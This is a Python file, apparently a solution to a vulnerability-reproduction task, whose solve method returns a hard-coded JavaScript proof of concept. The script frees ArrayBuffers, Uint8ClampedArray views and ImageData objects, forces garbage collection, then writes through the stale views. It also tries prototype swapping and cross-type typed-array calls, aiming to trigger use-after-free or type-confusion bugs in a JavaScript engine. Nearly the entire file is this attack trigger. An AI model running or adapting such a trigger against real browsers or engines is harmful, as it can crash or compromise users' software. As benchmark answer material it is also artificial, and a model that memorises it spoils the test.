import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""(function main() {
    function stressGC() {
        if (typeof gc === "function") {
            for (let i = 0; i < 10; i++) {
                gc();
            }
            return;
        }
        let junk = [];
        for (let i = 0; i < 4000; i++) {
            let arr = new Array(64);
            for (let j = 0; j < 64; j++) {
                arr[j] = (i ^ j) & 0xff;
            }
            junk.push(arr);
            if (typeof Uint8Array === "function") {
                let ta = new Uint8Array(256);
                ta[0] = i & 0xff;
            }
            if (junk.length > 1024)
                junk.length = 0;
        }
    }

    function scenarioTypedArrayBuffer() {
        if (typeof Uint8ClampedArray === "undefined" || typeof ArrayBuffer === "undefined")
            return;
        const SIZE = 0x8000;
        let buffer = new ArrayBuffer(SIZE);
        let view = new Uint8ClampedArray(buffer);
        buffer = null;
        for (let i = 0; i < 8; i++) {
            stressGC();
        }
        for (let i = 0; i < view.length; i += 97) {
            view[i] = (view[i] ^ 0x5a) & 0xff;
        }
    }

    function scenarioTypedArraySubarrays() {
        if (typeof Uint8ClampedArray === "undefined")
            return;
        let base = new Uint8ClampedArray(0x10000);
        let views = [];
        for (let i = 0; i < 64; i++) {
            views.push(base.subarray(i * 16, i * 16 + 1024));
        }
        base = null;
        stressGC();
        for (let v = 0; v < views.length; v++) {
            let view = views[v];
            for (let i = 0; i < view.length; i += 31) {
                view[i] = (view[i] + i + v) & 0xff;
            }
        }
    }

    function scenarioProtoConfusion() {
        if (typeof Uint8ClampedArray === "undefined")
            return;
        let a = new Uint8ClampedArray(1024);
        if (typeof Uint8Array !== "undefined") {
            Object.setPrototypeOf(a, Uint8Array.prototype);
        }
        stressGC();
        for (let i = 0; i < a.length; i += 13) {
            a[i] = (a[i] ^ 0xa5) & 0xff;
        }
    }

    function scenarioCrossTypedArray() {
        if (typeof Uint8ClampedArray === "undefined" || typeof Uint8Array === "undefined")
            return;
        let src = new Uint8Array(2048);
        for (let i = 0; i < src.length; i++) {
            src[i] = i & 0xff;
        }
        let dst = new Uint8ClampedArray(1024);
        stressGC();
        Uint8Array.prototype.set.call(dst, src);
        Uint8Array.prototype.copyWithin.call(dst, 0, 128, 512);
        Uint8Array.prototype.fill.call(dst, 0x7f);
    }

    function scenarioImageData() {
        if (typeof document === "undefined")
            return;
        let canvas = document.createElement("canvas");
        canvas.width = 128;
        canvas.height = 128;
        let ctx = canvas.getContext && canvas.getContext("2d");
        if (!ctx || !ctx.createImageData)
            return;
        for (let iter = 0; iter < 16; iter++) {
            let img = ctx.createImageData(64, 64);
            let data = img.data;
            img = null;
            stressGC();
            if (!data || !data.length)
                continue;
            for (let i = 0; i < data.length; i += 4) {
                data[i] = 255;
                data[i + 1] = 0;
                data[i + 2] = 0;
                data[i + 3] = 255;
            }
        }
    }

    function scenarioImageDataConstructor() {
        if (typeof Uint8ClampedArray === "undefined" || typeof ImageData === "undefined")
            return;
        let width = 64;
        let height = 64;
        let data = new Uint8ClampedArray(width * height * 4);
        for (let i = 0; i < data.length; i += 4) {
            data[i] = 0;
            data[i + 1] = 255;
            data[i + 2] = 0;
            data[i + 3] = 255;
        }
        let img = new ImageData(data, width, height);
        data = null;
        stressGC();
        let d = img.data;
        if (!d || !d.length)
            return;
        for (let i = 0; i < d.length; i += 16) {
            d[i] = (d[i] + 1) & 0xff;
        }
    }

    try { scenarioTypedArrayBuffer(); } catch (e) {}
    try { scenarioTypedArraySubarrays(); } catch (e) {}
    try { scenarioProtoConfusion(); } catch (e) {}
    try { scenarioCrossTypedArray(); } catch (e) {}
    try { scenarioImageData(); } catch (e) {}
    try { scenarioImageDataConstructor(); } catch (e) {}
})();"""
        return poc